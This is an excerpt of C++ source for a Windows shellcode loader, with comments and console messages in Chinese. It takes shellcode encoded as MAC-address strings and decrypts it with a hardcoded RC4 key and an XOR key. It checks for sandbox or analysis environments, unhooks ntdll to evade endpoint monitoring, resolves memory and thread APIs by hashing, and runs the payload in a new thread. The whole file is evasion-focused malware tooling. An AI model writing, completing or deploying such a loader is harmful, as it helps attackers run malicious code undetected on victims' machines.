...
// 解析命令行参数中的MAC格式shellcode
const char** parse_mac_arguments(int argc, char* argv[], size_t* mac_count) {
    if (argc < 2) {
        std::wcout << L"错误: 未提供shellcode参数" << std::endl;
        std::wcout << L"用法: " << argv[0] << L" MAC1 MAC2 ..." << std::endl;
        std::wcout << L"示例: " << argv[0] << L" 48-65-6C-6C-6F-2C 20-57-6F-72-6C-64 21-00-00-00-00-00" << std::endl;
        return NULL;
    }

    *mac_count = argc - 1;
    const char** mac_array = new const char* [*mac_count + 1]; // +1 用于结束标记
...
int main(int argc, char* argv[]) {
    ...
    // 解析命令行参数获取加密的shellcode
    size_t mac_count;
    const char** mac_shellcode = parse_mac_arguments(argc, argv, &mac_count);
    if (!mac_shellcode) return -1;

    // 加密时使用的密钥（必须与加密脚本一致）
    const unsigned char rc4_key[] = "MySecretKey123!@#"; // RC4密钥
    const unsigned char xor_key = 0xAB; // XOR密钥

    std::wcout << L"=== Shellcode加载器 ===" << std::endl;
    std::wcout << L"接收到 " << mac_count << L" 个MAC格式的shellcode片段" << std::endl;
    ...
    std::wcout << L"环境检测概率: " << probability << L"%" << std::endl;
    if (probability <= 40) {
        std::wcout << L"环境安全系数低，程序退出" << std::endl;
        delete[] mac_shellcode;
        return 0;
    }

    // 执行ntdll反挂钩
    std::wcout << L"开始执行ntdll反挂钩..." << std::endl;
    ...
    std::wcout << L"\n=== 开始执行Shellcode ===" << std::endl;

    // 获取kernel32.dll句柄
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        std::wcout << L"获取kernel32.dll句柄失败" << std::endl;
        free(rc4_data);
        return -1;
    }
    ...
    if (!pVirtualAlloc || !pVirtualProtect || !pCreateThread || !pWaitForSingleObject) {
        std::wcout << L"通过哈希查找API失败" << std::endl;
        free(rc4_data);
        return -1;
    }
    ...
    if (shellcodeSize == 0) {
        std::wcout << L"Shellcode长度为0，退出执行" << std::endl;
        free(rc4_data);
        return 0;
    }
    ...
    std::wcout << L"Shellcode已复制到内存地址: 0x" << std::hex << pShellcodeMemory << std::dec << std::endl;

    // 创建线程执行Shellcode
    std::wcout << L"创建线程执行Shellcode..." << std::endl;
    DWORD threadId;
    ...
    if (!hThread) {
        std::wcout << L"创建线程失败" << std::endl;
        VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
        free(rc4_data);
        return -1;
    }

    std::wcout << L"线程创建成功，ID: " << threadId << std::endl;
    std::wcout << L"等待Shellcode执行完成..." << std::endl;

    pWaitForSingleObject(hThread, INFINITE);
    std::wcout << L"Shellcode执行完成" << std::endl;

    CloseHandle(hThread);
    VirtualFree(pShellcodeMemory, 0, MEM_RELEASE);
    std::wcout << L"资源已释放" << std::endl;
